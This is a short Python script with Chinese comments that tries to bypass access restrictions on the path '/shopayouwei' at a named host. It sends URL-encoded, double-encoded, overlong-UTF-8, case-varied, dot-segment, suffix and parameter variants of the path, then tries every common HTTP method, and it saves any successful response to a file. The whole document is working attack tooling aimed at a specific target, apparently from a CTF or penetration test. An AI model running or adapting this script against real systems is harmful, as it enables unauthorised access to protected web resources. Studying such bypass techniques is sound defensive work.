import requests

base_url = "http://dc380860.clsadp.com"
session = requests.Session()

# 路径绕过技巧
print("[*] 尝试路径绕过技巧...")
bypass_paths = [
    # URL编码
    "/shopayouwei",
    "/%73%68%6f%70%61%79%6f%75%77%65%69",
    "/SHOPAYOUWEI",
    "/ShOpAyOuWeI",
    
    # 路径穿越
    "/./shopayouwei",
    "//shopayouwei",
    "/shopayouwei/",
    "/shopayouwei//",
    "/shopayouwei/.",
    "/shopayouwei/./",
    
    # 添加参数
    "/shopayouwei?",
    "/shopayouwei?a=1",
    "/shopayouwei#",
    "/shopayouwei;",
    
    # 添加后缀
    "/shopayouwei.html",
    "/shopayouwei.php",
    "/shopayouwei.jsp",
    
    # 双重编码
    "/%2573%2568%256f%2570%2561%2579%256f%2575%2577%2565%2569",
    
    # Unicode编码
    "/shop%c0%afayouwei",
    
    # 路径组合
    "/shop/ayouwei",
    "/shop/../shopayouwei",
    "/./shop./ayouwei",
]

for path in bypass_paths:
    try:
        response = session.get(f"{base_url}{path}", timeout=5, allow_redirects=False)
        if response.status_code != 403 and response.status_code != 404:
            print(f"[+] {path:45s} - {response.status_code}")
            if response.status_code == 200:
                print(f"    [!] 成功! 内容: {response.text[:200]}")
                with open("bypass_success.html", "w") as f:
                    f.write(response.text)
                break
    except:
        pass

# 尝试HTTP方法绕过
print("\n[*] 尝试HTTP方法绕过...")
methods = ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS", "TRACE", "CONNECT"]
for method in methods:
    try:
        response = requests.request(method, f"{base_url}/shopayouwei", timeout=5)
        if response.status_code != 403 and response.status_code != 404 and response.status_code != 405:
            print(f"[+] {method:10s} - {response.status_code}")
            if response.status_code == 200:
                print(f"    内容: {response.text[:200]}")
    except:
        pass

print("\n[*] 测试完成")
